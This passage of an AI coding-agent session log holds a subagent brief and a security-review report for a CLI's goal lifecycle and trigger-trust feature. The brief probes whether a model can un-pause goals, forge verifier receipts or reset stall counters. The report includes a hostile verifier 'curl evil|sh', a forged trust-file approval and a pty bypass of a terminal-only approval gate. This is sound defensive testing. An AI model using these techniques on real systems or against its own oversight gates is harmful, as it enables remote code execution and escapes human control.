ailure fingerprint and not turn count, completion decided only by a verifier receipt, an optional token budget rolling up from sub-operations; `/team` leaves experimental only after PA-1 and PA-2\". Acceptance: \"stale goal resumes paused with a visible reason; a model 'I am done' does not complete a goal\". Read `docs/v1.3.0/PA3_ACCEPTANCE.md`, `PA3_GOAL_LIFECYCLE.md`, `PA4_GOAL_LEDGER_PROPAGATION.md`, the history (`git log --oneline origin/release/v1.3.0 | grep -iE 'pa3|goal|758|pause'`) and the earlier review comments on PR #758 (`gh pr view 758 --comments`: the reviewer asked changes because 'a restart without a host reboot is not detected': check whether that was fixed and how), then the code (`cli/src/core/goal*.ts`, the goal ledger, `operation_runner*.ts`, `/goal` and `/team` command code, slash catalogue). Do NOT take the acceptance doc's claims on trust: RUN each, with a throwaway HOME, temp workspaces, scripted gateway (`cli/test/helpers/fixtures.ts` `startGateway`/`makeHome`), no network, no live inference:\n1. Stale goal resumes paused with a visible reason: (a) a goal active when the process was killed (kill -9 by pid) and restarted WITHOUT a host reboot (new process, same boot id): is it paused, with what reason text, visible in `/goal` status, `nexus operation status`, the TUI/sidecar events, the receipt? (b) restart after reboot (simulate by changing the boot id source in the test seam). (c) a goal whose driver is alive (second process running) must NOT be paused or double-driven; a stale lock from a dead pid; a recycled pid (start-time check); a different host name. (d) a hand-edited ledger entry (tamper: other boot id, missing boot id, future timestamps, unknown keys): fail closed (paused/blocked), never resume running. (e) the resume path: what must the operator do to resume; can the MODEL resume a paused goal (it must not be able to lift the pause itself: try via tools, slash commands issued by model text, `nexus operation resume` through `run_command`; state what an unsandboxed command can do vs sandboxed).\n2. \"I am done\" does not complete a goal: a scripted model that says it is done, calls `task_completed`, claims success in prose, or writes a fake receipt file / edits the ledger / writes into the verifier receipt location: the goal must not complete without a verifier receipt produced by the verifier path. Try forging the receipt file through the file tools (is the receipts/ledger directory a protected path?), a verifier that exits 0 without running tests (trivial `true` as verifier is the operator's choice: note), a verifier receipt from an earlier unit or another goal replayed, receipts with wrong goal id/unit/hash.\n3. Fingerprint stalls: same failure fingerprint N times → NOT_CONVERGING; different fingerprints do not trip it; fingerprints do not include secrets/paths that leak; counts persist across restart; reset rules (revise/replace/assign/set_inputs/lift) match the doc; can the model reset the count to evade the stall? (try each reset action from model-controlled input).\n4. Token budget: optional cap rolling up from sub-operations; pause at a safe boundary when exhausted; a child with unavailable accounting pauses before dispatch; can a sub-operation exceed the parent's budget by spawning concurrently; can the budget be raised by the model (resume with a higher cap needs the operator?).\n5. `/team`: is it still labelled experimental on the tip? The record says it may leave experimental now that PA-1 and PA-2 landed (\"slash catalogue change in the same PR if present\"). Find where the label lives (slash catalogue, docs, help text, TUI) and say whether the lift was done; do NOT do it, report where.\n6. Docs vs code for the goal lifecycle (`docs/…`, USER_MANUAL): list any false claim.\nRun at the tip, one at a time: `goal_lifecycle`, `operation_*` tests (`ls cli/test | grep -i operation`), `fault_kill_mid_tool_call`, `durable_continuity`, anything with `goal` in its name, `leak_guard`, `check_requirements`; `cd cli && npx tsc --noEmit -p .`; complexity gate (check the exit code); `node scripts/check_invariants.mjs`; `node scripts/check_doc_versions.mjs`. Mutations (copy aside, restore from the copy, never `git checkout`): the boot-id pause; the verifier-receipt completion gate; the fingerprint stall; the budget pause: each must fail a test.\nRules: do NOT edit ~/nexus-code or existing worktrees. `git -C ~/nexus-code fetch origin && git -C ~/nexus-code worktree add --detach ~/nexus-wt/revpa3 origin/release/v1.3.0`; `cp -a ~/nexus-code/cli/node_modules ~/nexus-wt/revpa3/cli/`; `mkdir -p ~/nexus-wt/revpa3/core/target/release && cp ~/nexus-wt/ls1b/core/target/release/{harness-core,nexus-tui} ~/nexus-wt/revpa3/core/target/release/`. Tests: `cd ~/nexus-wt/revpa3/cli && TMPDIR=/dev/shm HOME=$(mktemp -d) node --import tsx --test test/<name>.test.ts 2>&1 | tail -20`. Never touch the real ~/.nexus, ~/.config/nexus, /etc/nexus. Stop processes by their own pid; never `pkill -f`. No commits, pushes or GitHub comments. Remove probes and the worktree at the end. Shell is zsh (`bash -c` for loops); prefix `rtk proxy` if output looks filtered; a safety check blocks scripts containing `rm`.\nReport under 500 words: for each acceptance clause MET / NOT MET with the run that shows it; the status of #758's 'restart without host reboot' finding; findings with file:line, run-or-read, blocking or not (a goal that resumes running after a restart, completes without a verifier receipt, or can be un-paused/reset/budget-raised by model-controlled input is blocking); where the `/team` label lives; test counts; mutation results; what you did not check; and a concrete list of what is still needed to call PA-3 done.","outputFile":"/tmp/claude-1000/-home-mike-nexus-code/d25d0d24-8aed-4b03-a951-966dc54f0666/tasks/a16416f9733a377b9.output","canReadOutputFile":true,"canContinueAgent":true},"sourceToolAssistantUUID":"944a5f92-c7ae-4ffa-8ac0-ea65e7be932d","permissionDecision":{"decision":"accept","source":"config","reasonType":"mode"},"session_id":"d25d0d24-8aed-4b03-a951-966dc54f0666","userType":"external","entrypoint":"cli","cwd":"/home/mike/nexus-code","sessionId":"43bcbb67-2cff-4fa8-a05e-f8aa598df73b","version":"2.1.329","gitBranch":"v1/bg3-trust-abuse-model","slug":"synthetic-moseying-seahorse","dataFlowOn":true}
{"type":"queue-operation","operation":"enqueue","timestamp":"2026-11-24T23:54:29.614Z","sessionId":"43bcbb67-2cff-4fa8-a05e-f8aa598df73b","content":"<task-notification>\n<task-id>ad50109815f450d81</task-id>\n<tool-use-id>toolu_01V18grc6q37SCBioWiKW7JJ</tool-use-id>\n<output-file>/tmp/claude-1000/-home-mike-nexus-code/d25d0d24-8aed-4b03-a951-966dc54f0666/tasks/ad50109815f450d81.output</output-file>\n<status>completed</status>\n<summary>Agent \"Security review PR #803 BG-3 trust\" finished</summary>\n<note>A task-notification fires each time this agent stops with no live background children of its own. The user can send it another message and resume it, so the same task-id may notify more than once.</note>\n<result>**Verdict: REQUEST CHANGES** at `4dd93530c4e0fa3da5527d44a9cb668241bca055`. The head did not move and the PR is still open. `git log origin/release/v1.3.0..HEAD` shows only the 2 PR commits, and the diff is exactly the 10 files. I found no foreign commits.\n\n**Blocking (all run, not just read)**\n1. **The trust store is not a protected path.** `cli/src/security.ts:163-174` `DEFAULT_PROTECTED_PATHS` has `extension_trust.json`, `trusted_workspaces.json` and `hooks.json`, but not `trigger_trust.json`. `SecurityManager.isPathProtected(\".../trigger_trust.json\")` returns `protected:false` while the other three are protected.\n   - I forged an approval with an in-place rewrite, which is what an `edit_file` call does. The file kept mode 0600 and `triggers status` reported MATCH and \"may run: yes\".\n   - This is reachable when the workspace is `$HOME` or the tool can write outside the workspace.\n   - Fix: add `trigger_trust.json` and a test beside HK-1's.\n2. **`approve` hides what the spec does.** `triggers_cli.ts:187-191` prints only kind, id, policy, bounds and the prompt cut to 100 characters. It never shows `action.verifier`, `event.paths`, `allowedOrigins`, the rate, or whether a secret is set.\n   - A hostile spec with `verifier:\"curl evil|sh\"` and instructions after character 100 was approved on that display.\n   - Fix: print the full canonical spec, or the prompt in full with the verifier and paths.\n3. **The rate limiter has three problems.** Source is `trigger_rate_limit.ts`.\n   - **Quadratic cost.** Denied attempts are kept and re-parsed with `new Date()` on every call (`:147-176`). 3,000 attempts took 3.9s, and a day's flood is a CPU DoS.\n   - **Self-sustaining lockout.** Denied attempts count toward the window, so one probe every 30 minutes kept a 1/day trigger locked out for 24h.\n   - **Unbounded `limiters` map.** It reached 50,000 entries, and `limiterFor` ignores the workspace. It also returns a stale limiter after a re-approved spec changes the rate (`:199-206`).\n   - Fix: don't record denials in the window, cap the arrays and the map, and key on workspace plus id.\n4. **`restore()` fails open on tampered state.**\n   - A quarantine with `until:\"garbage\"` admitted the next attempt, because `now &lt; Invalid Date` is false.\n   - A restored rate of `Infinity` admitted 1000 of 1000.\n   - Fix: validate every restored field and fall back to the spec's rate.\n5. **The workspace cap is never enforced.** `checkAndRecord` never consults `WorkspaceRateLimiter`. 100 triggers firing returned `workspaceWithinLimits:true`, because nothing feeds it.\n\n**Non-blocking**\n- Terminal-only approval is bypassed by a pty: `echo y | script -qec \"nexus triggers approve\"` approved the spec.\n- `docs/TRIGGERS.md` never says that any process with a shell can do this.\n- There is no `--yes` or env path, and the mutation test confirms the gate is tested. I did not test `--sandbox` reachability.\n- Docs against code:\n  - The documented example fails to parse: each trigger needs `format` and `version`.\n  - `nexus triggers release` is documented but not built.\n  - The id rule in the docs differs from the code.\n  - Duplicate ids are not rejected: both were approved and only one entry kept.\n  - A bad third spec still let approval proceed for the others.\n  - The docs say the key is the file's SHA-256, but the code keys on each spec's canonical hash.\n- The spec file must be mode 0600 (`triggers_cli.ts:74`). A git checkout gives 0644, so list and approve refuse it.\n- Store problems (corrupt, 0644, symlink) all fail closed, but the CLI shows only `NEW` and discards the reason.\n- `NEXUS_TRUST_WORKSPACE=1` grants trigger trust, and `status` reported \"may run: yes\" for an untrusted workspace.\n- A secret of `a` is accepted, and it sits in the repo file.\n- Spec parsing held up: duplicate keys, BOM, `__proto__`, deep nesting, `1e999`, 0 and out-of-range numbers, `..`, backslash and Unicode ids were all rejected. Paths `~/x`, `C:/x`, control characters and `**` are accepted as globs.\n\n**What the firer must add**\n- Re-parse the spec bytes once and fire exactly what was hashed.\n- Reject duplicate ids and paths that resolve outside the workspace (symlinks).\n- Treat webhook paths as relative only.\n- Run rate and quarantine checks after authentication and before body parsing.\n- Add a body-size cap.\n- Bind the listener to loopback by default.\n- Use HMAC over the body plus a timestamp/nonce for replay protection.\n- Keep the secret out of the repository (env or keychain).\n- Do not treat Origin as authentication.\n- Persist limiter state privately with validation.\n- Check the workspace cap and exclude `.nexus/triggers.json` and `.git` from file-change events.\n- Re-check trust at fire time.\n- Run with unattended defaults.\n\n**Tests:** the new files pass 21, 15, 13 and 11 (60 total). `leak_guard` 6, `check_requirements` 28, `security` 14, `workspace_trust` 5, `hooks_self_approval` 10 and `protocol_schema` 8 all pass. `tsc`, the complexity gate, `check_invariants` and `check_doc_versions` are clean.\n\n**Mutations**\n\n| Mutation | Result |\n|---|---|\n| No terminal | caught |\n| Skip hash in spec | caught |\n| Skip hash in CLI list | **survived** |\n| Workspace-trust gate | caught |\n| `approveTrigger` gate | caught |\n| Quarantine | caught |\n| Corrupt entry skipped | **survived** |\n| 0644 store accepted | no test failed; my `sed` may not have applied, so unverified |\n\n**Not checked:** `--sandbox` reachability, other-uid stores, a real webhook listener (there is none), and Node 22 against 24.</result>\n<usage><subagent_tokens>97812</subagent_tokens><tool_uses>26</tool_uses><duration_ms>574866</duration_ms></usage>\n</task-notification>"}
